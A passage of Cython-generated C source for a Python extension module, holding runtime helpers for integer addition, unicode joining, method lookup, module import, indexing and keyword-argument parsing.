                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_add(op1, op2);
            }
        }
                x = a + b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla + llb;
            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
#if CYTHON_COMPILING_IN_LIMITED_API
        double a = __pyx_PyFloat_AsDouble(op1);
#else
        double a = PyFloat_AS_DOUBLE(op1);
#endif
            double result;
            
            PyFPE_START_PROTECT("add", return NULL)
            result = ((double)a) + (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);
}
#endif

/* JoinPyUnicode */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      Py_UCS4 max_char) {
#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    PyObject *result_uval;
    int result_ukind, kind_shift;
    Py_ssize_t i, char_pos;
    void *result_udata;
    CYTHON_MAYBE_UNUSED_VAR(max_char);
#if CYTHON_PEP393_ENABLED
    result_uval = PyUnicode_New(result_ulength, max_char);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;
    kind_shift = (result_ukind == PyUnicode_4BYTE_KIND) ? 2 : result_ukind - 1;
    result_udata = PyUnicode_DATA(result_uval);
#else
    result_uval = PyUnicode_FromUnicode(NULL, result_ulength);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = sizeof(Py_UNICODE);
    kind_shift = (result_ukind == 4) ? 2 : result_ukind - 1;
    result_udata = PyUnicode_AS_UNICODE(result_uval);
#endif
    assert(kind_shift == 2 || kind_shift == 1 || kind_shift == 0);
    char_pos = 0;
    for (i=0; i < value_count; i++) {
        int ukind;
        Py_ssize_t ulength;
        void *udata;
        PyObject *uval = PyTuple_GET_ITEM(value_tuple, i);
        if (unlikely(__Pyx_PyUnicode_READY(uval)))
            goto bad;
        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);
        if (unlikely(!ulength))
            continue;
        if (unlikely((PY_SSIZE_T_MAX >> kind_shift) - ulength < char_pos))
            goto overflow;
        ukind = __Pyx_PyUnicode_KIND(uval);
        udata = __Pyx_PyUnicode_DATA(uval);
        if (!CYTHON_PEP393_ENABLED || ukind == result_ukind) {
            memcpy((char *)result_udata + (char_pos << kind_shift), udata, (size_t) (ulength << kind_shift));
        } else {
            #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030300F0 || defined(_PyUnicode_FastCopyCharacters)
            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);
            #else
            Py_ssize_t j;
            for (j=0; j < ulength; j++) {
                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);
                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos+j, uchar);
            }
            #endif
        }
        char_pos += ulength;
    }
    return result_uval;
overflow:
    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");
bad:
    Py_DECREF(result_uval);
    return NULL;
#else
    CYTHON_UNUSED_VAR(max_char);
    CYTHON_UNUSED_VAR(result_ulength);
    CYTHON_UNUSED_VAR(value_count);
    return PyUnicode_Join(__pyx_empty_unicode, value_tuple);
#endif
}

/* PyObjectCall2Args */
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args[3] = {NULL, arg1, arg2};
    return __Pyx_PyObject_FastCall(function, args+1, 2 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);
}

/* PyObjectGetMethod */
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method) {
    PyObject *attr;
#if CYTHON_UNPACK_METHODS && CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_PYTYPE_LOOKUP
    __Pyx_TypeName type_name;
    PyTypeObject *tp = Py_TYPE(obj);
    PyObject *descr;
    descrgetfunc f = NULL;
    PyObject **dictptr, *dict;
    int meth_found = 0;
    assert (*method == NULL);
    if (unlikely(tp->tp_getattro != PyObject_GenericGetAttr)) {
        attr = __Pyx_PyObject_GetAttrStr(obj, name);
        goto try_unpack;
    }
    if (unlikely(tp->tp_dict == NULL) && unlikely(PyType_Ready(tp) < 0)) {
        return 0;
    }
    descr = _PyType_Lookup(tp, name);
    if (likely(descr != NULL)) {
        Py_INCREF(descr);
#if defined(Py_TPFLAGS_METHOD_DESCRIPTOR) && Py_TPFLAGS_METHOD_DESCRIPTOR
        if (__Pyx_PyType_HasFeature(Py_TYPE(descr), Py_TPFLAGS_METHOD_DESCRIPTOR))
#elif PY_MAJOR_VERSION >= 3
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_IS_TYPE(descr, &PyMethodDescr_Type) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr) || __Pyx_IS_TYPE(descr, &PyMethodDescr_Type)))
        #endif
#else
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr)))
        #endif
#endif
        {
            meth_found = 1;
        } else {
            f = Py_TYPE(descr)->tp_descr_get;
            if (f != NULL && PyDescr_IsData(descr)) {
                attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
                Py_DECREF(descr);
                goto try_unpack;
            }
        }
    }
    dictptr = _PyObject_GetDictPtr(obj);
    if (dictptr != NULL && (dict = *dictptr) != NULL) {
        Py_INCREF(dict);
        attr = __Pyx_PyDict_GetItemStr(dict, name);
        if (attr != NULL) {
            Py_INCREF(attr);
            Py_DECREF(dict);
            Py_XDECREF(descr);
            goto try_unpack;
        }
        Py_DECREF(dict);
    }
    if (meth_found) {
        *method = descr;
        return 1;
    }
    if (f != NULL) {
        attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
        Py_DECREF(descr);
        goto try_unpack;
    }
    if (likely(descr != NULL)) {
        *method = descr;
        return 0;
    }
    type_name = __Pyx_PyType_GetName(tp);
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'" __Pyx_FMT_TYPENAME "' object has no attribute '%U'",
                 type_name, name);
#else
                 "'" __Pyx_FMT_TYPENAME "' object has no attribute '%.400s'",
                 type_name, PyString_AS_STRING(name));
#endif
    __Pyx_DECREF_TypeName(type_name);
    return 0;
#else
    attr = __Pyx_PyObject_GetAttrStr(obj, name);
    goto try_unpack;
#endif
try_unpack:
#if CYTHON_UNPACK_METHODS
    if (likely(attr) && PyMethod_Check(attr) && likely(PyMethod_GET_SELF(attr) == obj)) {
        PyObject *function = PyMethod_GET_FUNCTION(attr);
        Py_INCREF(function);
        Py_DECREF(attr);
        *method = function;
        return 1;
    }
#endif
    *method = attr;
    return 0;
}

/* PyObjectCallMethod1 */
static PyObject* __Pyx__PyObject_CallMethod1(PyObject* method, PyObject* arg) {
    PyObject *result = __Pyx_PyObject_CallOneArg(method, arg);
    Py_DECREF(method);
    return result;
}
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg) {
    PyObject *method = NULL, *result;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_Call2Args(method, obj, arg);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) return NULL;
    return __Pyx__PyObject_CallMethod1(method, arg);
}

/* append */
static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x) {
    if (likely(PyList_CheckExact(L))) {
        if (unlikely(__Pyx_PyList_Append(L, x) < 0)) return -1;
    } else {
        PyObject* retval = __Pyx_PyObject_CallMethod1(L, __pyx_n_s_append, x);
        if (unlikely(!retval))
            return -1;
        Py_DECREF(retval);
    }
    return 0;
}

/* PyObjectLookupSpecial */
#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx__PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name, int with_error) {
    PyObject *res;
    PyTypeObject *tp = Py_TYPE(obj);
#if PY_MAJOR_VERSION < 3
    if (unlikely(PyInstance_Check(obj)))
        return with_error ? __Pyx_PyObject_GetAttrStr(obj, attr_name) : __Pyx_PyObject_GetAttrStrNoError(obj, attr_name);
#endif
    res = _PyType_Lookup(tp, attr_name);
    if (likely(res)) {
        descrgetfunc f = Py_TYPE(res)->tp_descr_get;
        if (!f) {
            Py_INCREF(res);
        } else {
            res = f(res, obj, (PyObject *)tp);
        }
    } else if (with_error) {
        PyErr_SetObject(PyExc_AttributeError, attr_name);
    }
    return res;
}
#endif

/* RaiseUnboundLocalError */
static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname) {
    PyErr_Format(PyExc_UnboundLocalError, "local variable '%s' referenced before assignment", varname);
}

/* RaiseTooManyValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected) {
    PyErr_Format(PyExc_ValueError,
                 "too many values to unpack (expected %" CYTHON_FORMAT_SSIZE_T "d)", expected);
}

/* RaiseNeedMoreValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index) {
    PyErr_Format(PyExc_ValueError,
                 "need more than %" CYTHON_FORMAT_SSIZE_T "d value%.1s to unpack",
                 index, (index == 1) ? "" : "s");
}

/* IterFinish */
static CYTHON_INLINE int __Pyx_IterFinish(void) {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    PyObject* exc_type = __Pyx_PyErr_CurrentExceptionType();
    if (unlikely(exc_type)) {
        if (unlikely(!__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration)))
            return -1;
        __Pyx_PyErr_Clear();
        return 0;
    }
    return 0;
}

/* UnpackItemEndCheck */
static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected) {
    if (unlikely(retval)) {
        Py_DECREF(retval);
        __Pyx_RaiseTooManyValuesError(expected);
        return -1;
    }
    return __Pyx_IterFinish();
}

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *module = 0;
    PyObject *empty_dict = 0;
    PyObject *empty_list = 0;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (unlikely(!py_import))
        goto bad;
    if (!from_list) {
        empty_list = PyList_New(0);
        if (unlikely(!empty_list))
            goto bad;
        from_list = empty_list;
    }
    #endif
    empty_dict = PyDict_New();
    if (unlikely(!empty_dict))
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                #if CYTHON_COMPILING_IN_LIMITED_API
                module = PyImport_ImportModuleLevelObject(
                    name, empty_dict, empty_dict, from_list, 1);
                #else
                module = PyImport_ImportModuleLevelObject(
                    name, __pyx_d, empty_dict, from_list, 1);
                #endif
                if (unlikely(!module)) {
                    if (unlikely(!PyErr_ExceptionMatches(PyExc_ImportError)))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (unlikely(!py_level))
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, __pyx_d, empty_dict, from_list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            #if CYTHON_COMPILING_IN_LIMITED_API
            module = PyImport_ImportModuleLevelObject(
                name, empty_dict, empty_dict, from_list, level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, __pyx_d, empty_dict, from_list, level);
            #endif
            #endif
        }
    }
bad:
    Py_XDECREF(empty_dict);
    Py_XDECREF(empty_list);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    return module;
}

/* ImportDottedModule */
#if PY_MAJOR_VERSION >= 3
static PyObject *__Pyx__ImportDottedModule_Error(PyObject *name, PyObject *parts_tuple, Py_ssize_t count) {
    PyObject *partial_name = NULL, *slice = NULL, *sep = NULL;
    if (unlikely(PyErr_Occurred())) {
        PyErr_Clear();
    }
    if (likely(PyTuple_GET_SIZE(parts_tuple) == count)) {
        partial_name = name;
    } else {
        slice = PySequence_GetSlice(parts_tuple, 0, count);
        if (unlikely(!slice))
            goto bad;
        sep = PyUnicode_FromStringAndSize(".", 1);
        if (unlikely(!sep))
            goto bad;
        partial_name = PyUnicode_Join(sep, slice);
    }
    PyErr_Format(
#if PY_MAJOR_VERSION < 3
        PyExc_ImportError,
        "No module named '%s'", PyString_AS_STRING(partial_name));
#else
#if PY_VERSION_HEX >= 0x030600B1
        PyExc_ModuleNotFoundError,
#else
        PyExc_ImportError,
#endif
        "No module named '%U'", partial_name);
#endif
bad:
    Py_XDECREF(sep);
    Py_XDECREF(slice);
    Py_XDECREF(partial_name);
    return NULL;
}
#endif
#if PY_MAJOR_VERSION >= 3
static PyObject *__Pyx__ImportDottedModule_Lookup(PyObject *name) {
    PyObject *imported_module;
#if PY_VERSION_HEX < 0x030700A1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM  < 0x07030400)
    PyObject *modules = PyImport_GetModuleDict();
    if (unlikely(!modules))
        return NULL;
    imported_module = __Pyx_PyDict_GetItemStr(modules, name);
    Py_XINCREF(imported_module);
#else
    imported_module = PyImport_GetModule(name);
#endif
    return imported_module;
}
#endif
#if PY_MAJOR_VERSION >= 3
static PyObject *__Pyx_ImportDottedModule_WalkParts(PyObject *module, PyObject *name, PyObject *parts_tuple) {
    Py_ssize_t i, nparts;
    nparts = PyTuple_GET_SIZE(parts_tuple);
    for (i=1; i < nparts && module; i++) {
        PyObject *part, *submodule;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        part = PyTuple_GET_ITEM(parts_tuple, i);
#else
        part = PySequence_ITEM(parts_tuple, i);
#endif
        submodule = __Pyx_PyObject_GetAttrStrNoError(module, part);
#if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
        Py_DECREF(part);
#endif
        Py_DECREF(module);
        module = submodule;
    }
    if (unlikely(!module)) {
        return __Pyx__ImportDottedModule_Error(name, parts_tuple, i);
    }
    return module;
}
#endif
static PyObject *__Pyx__ImportDottedModule(PyObject *name, PyObject *parts_tuple) {
#if PY_MAJOR_VERSION < 3
    PyObject *module, *from_list, *star = __pyx_n_s__31;
    CYTHON_UNUSED_VAR(parts_tuple);
    from_list = PyList_New(1);
    if (unlikely(!from_list))
        return NULL;
    Py_INCREF(star);
    PyList_SET_ITEM(from_list, 0, star);
    module = __Pyx_Import(name, from_list, 0);
    Py_DECREF(from_list);
    return module;
#else
    PyObject *imported_module;
    PyObject *module = __Pyx_Import(name, NULL, 0);
    if (!parts_tuple || unlikely(!module))
        return module;
    imported_module = __Pyx__ImportDottedModule_Lookup(name);
    if (likely(imported_module)) {
        Py_DECREF(module);
        return imported_module;
    }
    PyErr_Clear();
    return __Pyx_ImportDottedModule_WalkParts(module, name, parts_tuple);
#endif
}
static PyObject *__Pyx_ImportDottedModule(PyObject *name, PyObject *parts_tuple) {
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030400B1
    PyObject *module = __Pyx__ImportDottedModule_Lookup(name);
    if (likely(module)) {
        PyObject *spec = __Pyx_PyObject_GetAttrStrNoError(module, __pyx_n_s_spec);
        if (likely(spec)) {
            PyObject *unsafe = __Pyx_PyObject_GetAttrStrNoError(spec, __pyx_n_s_initializing);
            if (likely(!unsafe || !__Pyx_PyObject_IsTrue(unsafe))) {
                Py_DECREF(spec);
                spec = NULL;
            }
            Py_XDECREF(unsafe);
        }
        if (likely(!spec)) {
            PyErr_Clear();
            return module;
        }
        Py_DECREF(spec);
        Py_DECREF(module);
    } else if (PyErr_Occurred()) {
        PyErr_Clear();
    }
#endif
    return __Pyx__ImportDottedModule(name, parts_tuple);
}

/* PyObjectCallNoArg */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
    PyObject *arg = NULL;
    return __Pyx_PyObject_FastCall(func, (&arg)+1, 0 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);
}

/* pep479 */
static void __Pyx_Generator_Replace_StopIteration(int in_async_gen) {
    PyObject *exc, *val, *tb, *cur_exc;
    __Pyx_PyThreadState_declare
    #ifdef __Pyx_StopAsyncIteration_USED
    int is_async_stopiteration = 0;
    #endif
    CYTHON_MAYBE_UNUSED_VAR(in_async_gen);
    cur_exc = PyErr_Occurred();
    if (likely(!__Pyx_PyErr_GivenExceptionMatches(cur_exc, PyExc_StopIteration))) {
        #ifdef __Pyx_StopAsyncIteration_USED
        if (in_async_gen && unlikely(__Pyx_PyErr_GivenExceptionMatches(cur_exc, __Pyx_PyExc_StopAsyncIteration))) {
            is_async_stopiteration = 1;
        } else
        #endif
            return;
    }
    __Pyx_PyThreadState_assign
    __Pyx_GetException(&exc, &val, &tb);
    Py_XDECREF(exc);
    Py_XDECREF(val);
    Py_XDECREF(tb);
    PyErr_SetString(PyExc_RuntimeError,
        #ifdef __Pyx_StopAsyncIteration_USED
        is_async_stopiteration ? "async generator raised StopAsyncIteration" :
        in_async_gen ? "async generator raised StopIteration" :
        #endif
        "generator raised StopIteration");
}

/* StringJoin */
#if !CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyBytes_Join(PyObject* sep, PyObject* values) {
    return PyObject_CallMethodObjArgs(sep, __pyx_n_s_join, values, NULL);
}
#endif

/* GetItemInt */
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (unlikely(!j)) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PyMappingMethods *mm = Py_TYPE(o)->tp_as_mapping;
        PySequenceMethods *sm = Py_TYPE(o)->tp_as_sequence;
        if (mm && mm->mp_subscript) {
            PyObject *r, *key = PyInt_FromSsize_t(i);
            if (unlikely(!key)) return NULL;
            r = mm->mp_subscript(o, key);
            Py_DECREF(key);
            return r;
        }
        if (likely(sm && sm->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(sm->sq_length)) {
                Py_ssize_t l = sm->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return sm->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}

/* RaiseArgTupleInvalid */
static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char *more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    } else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
                 func_name, more_or_less, num_expected,
                 (num_expected == 1) ? "" : "s", num_found);
}

/* RaiseDoubleKeywords */
static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
        #if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
        #else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
        #endif
}

/* ParseKeywords */
static int __Pyx_ParseOptionalKeywords(
    PyObject *kwds,
    PyObject *const *kwvalues,
    PyObject **argnames[],
    PyObject *kwds2,
    PyObject *values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject *key = 0, *value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    int kwds_is_tuple = CYTHON_METH_FASTCALL && likely(PyTuple_Check(kwds));
    while (1) {
        if (kwds_is_tuple) {
            if (pos >= PyTuple_GET_SIZE(kwds)) break;
            key = PyTuple_GET_ITEM(kwds, pos);
            value = kwvalues[pos];
            pos++;
        }
        else
        {
            if (!PyDict_Next(kwds, &pos, &key, &value)) break;
        }
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name-argnames] = value;
            continue;
        }
        name = first_kw_arg;
        #if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**name, key)) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                            (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                             && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        } else
        #endif
        if (likely(PyUnicode_Check(key))) {
            while (*name) {
                int cmp = (
                #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                    (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                #endif
                    PyUnicode_Compare(**name, key)
                );
                if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                if (cmp == 0) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    int cmp = (**argname == key) ? 0 :
                    #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                    #endif
                        PyUnicode_Compare(**argname, key);
                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) goto arg_passed_twice;
                    argname++;
                }
            }
        } else
            goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        } else {
            goto invalid_keyword;
        }
    }
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    #if PY_MAJOR_VERSION < 3
    PyErr_Format(PyExc_TypeError,
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
    PyErr_Format(PyExc_TypeError,
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
bad:
    return -1;
}

/* DictGetItem */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key) {
    PyObject *value;
    value = PyDict_GetItemWithError(d, key);
    if (unlikely(!value)) {
        if (!PyErr_Occurred()) {
            if (unlikely(PyTuple_Check(key))) {
                PyObject* args = PyTuple_Pack(1, key);
                if (likely(args)) {
                    PyErr_SetObject(PyExc_KeyError, args);
                    Py_DECREF(args);
                }
            } else {
                PyErr_SetObject(PyExc_KeyError, key);
            }
        }
        return NULL;
    }
    Py_INCREF(value);
    return value;
}
#endif

/* UnicodeConcatInPlace */
# if CYTHON_COMPILING_IN_CPYTHON && PY_MAJOR_VERSION >= 3
static int
__Pyx_unicode_modifiable(PyObject *unicode)
{
    if (Py_REFCNT(unicode) != 1)
        return 0;
